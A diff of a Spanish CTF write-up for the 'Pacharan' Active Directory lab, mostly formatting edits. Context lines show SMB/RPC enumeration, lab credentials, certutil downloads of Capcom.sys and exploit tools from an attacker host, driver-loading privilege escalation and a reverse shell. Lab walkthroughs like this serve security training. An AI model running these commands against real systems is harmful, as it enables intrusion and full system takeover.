@@ -5,7 +5,7 @@ icon: windows
 **Plataforma:** The Hackers Labs\
 **Sistema Operativo:** Windows
 
-> **Tags:** `Windows` `SMB` `Information Leakage` `Password Spraying` `WinRM` `SeLoadDriverPrivilege` 
+> **Tags:** `Active Directory` `SMB` `Information Leakage` `Password Spraying` `WinRM` `SeLoadDriverPrivilege` 
 
 ## INSTALACIÓN
 
@@ -66,15 +66,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
 ```
 
-Observamos que el dominio es PACHARAN.THL, lo añadimos al archivo /etc/hosts.
+Observamos que el dominio es `PACHARAN.THL`, lo añadimos al archivo `/etc/hosts`.
 
 ```bash
 sudo nano /etc/hosts
 ```
 
 ```
-127.0.0.1	localhost
-127.0.1.1	kali
+127.0.0.1	      localhost
+127.0.1.1	      kali
 192.168.69.69   PACHARAN.THL
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
@@ -82,9 +82,9 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Hemos revelado múltiples puertos abiertos característicos de un entorno Active Directory. 
+Hemos revelado múltiples puertos abiertos característicos de un entorno `Active Directory`. 
 
-Procedemos a extraer información del dominio utilizando Enum4linux-ng.
+Procedemos a extraer información del dominio utilizando `Enum4linux-ng`.
 
 ```bash
 enum4linux-ng -a PACHARAN.THL
@@ -225,7 +225,6 @@ Encontramos un recurso compartido inusual llamado `NETLOGON2` con permisos de le
 smbclient //PACHARAN.THL/NETLOGON2 -U guest -p
 ```
 
-Info:
 ```
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -360,7 +359,6 @@ Comprobamos si este usuario tiene acceso remoto mediante `WinRM` a través del p
 nxc winrm PACHARAN.THL -u Orujo -p 'Pericodelospalotes6969'
 ```
 
-Info:
 ```
 WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
@@ -399,7 +397,6 @@ Vemos que tenemos acceso de lectura al recurso compartido `PACHARAN`. Nos conect
 smbclient //PACHARAN.THL/PACHARAN -U Orujo -p
 ```
 
-Info:
 ```
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -512,7 +509,6 @@ Utilizamos estas credenciales para conectarnos por `RPC` con la herramienta `rpc
 rpcclient -U Whisky 192.168.69.69
 ```
 
-Info:
 ```
 rpcclient $> enumprinters
 	flags:[0x800000]
@@ -552,7 +548,6 @@ Encontramos que las credenciales son válidas para el usuario `Chivas Regal`. Co
 netexec winrm PACHARAN.THL -u 'Chivas Regal' -p TurkisArrusPuchuchuSiu1
 ```
 
-Info:
 ```
 WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
@@ -629,13 +624,12 @@ mkdir temp
 cd temp
 ```
 
-```DOS
+```powershell
 certutil.exe -urlcache -split -f http://192.168.69.100/Capcom.sys capcom.sys
 certutil.exe -urlcache -split -f http://192.168.69.100/ExploitCapcom.exe exploitcapcom.exe
 certutil.exe -urlcache -split -f http://192.168.69.100/eoploaddriver_x64.exe eoploaddriver_x64.exe
 ```
 
-Info:
 ```
 **** En línea  ****
   0000  ...
@@ -645,17 +639,16 @@ CertUtil: -URLCache comando completado correctamente.
 
 Primero, activamos el privilegio `SeLoadDriverPrivilege` haciendo uso de la herramienta que acabamos de subir.
 
-```DOS
+```powershell
 ./eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\temp\capcom.sys
 ```
 
 A continuación, utilizamos `ExploitCapcom.exe` para cargar el controlador malicioso `Capcom.sys` en el sistema destino.
 
-```DOS
+```powershell
 .\exploitcapcom.exe LOAD C:\temp\capcom.sys
 ```
 
-Info:
 ```
 [*] Service Name: xtazoicz
 [+] Enabling SeLoadDriverPrivilege
@@ -668,11 +661,10 @@ Una vez que hemos cargado exitosamente el driver, podemos ejecutar cualquier com
 
 Lo comprobamos invocando `whoami`.
 
-```DOS
+```powershell
 .\exploitcapcom.exe EXPLOIT whoami
 ```
 
-Info:
 ```
 [*] Capcom.sys exploit
 [*] Capcom.sys handle was obtained as 0000000000000064
@@ -714,8 +706,8 @@ msf exploit(multi/handler) > set LHOST 192.168.69.100
 msf exploit(multi/handler) > run
 ```
 
-```DOS
-C:\temp> .\exploitcapcom.exe EXPLOIT revshell.exe
+```powershell
+.\exploitcapcom.exe EXPLOIT revshell.exe
 ```
 
 Info:
